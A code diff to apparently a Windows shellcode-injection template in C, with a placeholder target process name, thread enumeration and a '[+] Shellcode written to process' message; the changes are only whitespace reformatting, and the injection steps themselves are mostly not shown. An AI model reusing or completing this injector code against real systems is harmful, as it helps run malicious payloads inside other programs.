@@ -16,14 +16,14 @@ Externally defined shellcode variables:
 
 #define INITIAL_THREAD_CAPACITY 1024
 
-int main( int argc, char *argv[] ) {
+int main( int argc, char * argv[] ) {
     HANDLE snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0 );
-    HANDLE rpoc = NULL;
+    HANDLE rpoc     = NULL;
 
-    PROCESSENTRY32 procEntry = { sizeof( PROCESSENTRY32 ) };
+    PROCESSENTRY32 procEntry  = { sizeof( PROCESSENTRY32 ) };
     THREADENTRY32 threadEntry = { sizeof( THREADENTRY32 ) };
 
-    const wchar_t *pname = L"${ PNAME }";
+    const wchar_t * pname = L"${ PNAME }";
 
     int threadCount = 0, cc = INITIAL_THREAD_CAPACITY;
 
@@ -76,7 +76,7 @@ int main( int argc, char *argv[] ) {
 
     printf( "[+] Shellcode written to process: %S\n", pname );
 
-    DWORD *threadIds = malloc( sizeof( DWORD ) * cc );
+    DWORD * threadIds = malloc( sizeof( DWORD ) * cc );
     if ( threadIds == NULL ) {
         printf( "[-] Failed to allocate memory for thread IDs\n" );
         CloseHandle( snapshot );
@@ -89,7 +89,7 @@ int main( int argc, char *argv[] ) {
             if ( threadEntry.th32OwnerProcessID == procEntry.th32ProcessID ) {
                 if ( threadCount >= cc ) {
                     cc *= 2;
-                    DWORD *temp = realloc( threadIds, sizeof( DWORD ) * cc );
+                    DWORD * temp = realloc( threadIds, sizeof( DWORD ) * cc );
                     if ( temp == NULL ) {
                         printf( "[-] Failed to reallocate memory for thread IDs\n" );
                         free( threadIds );
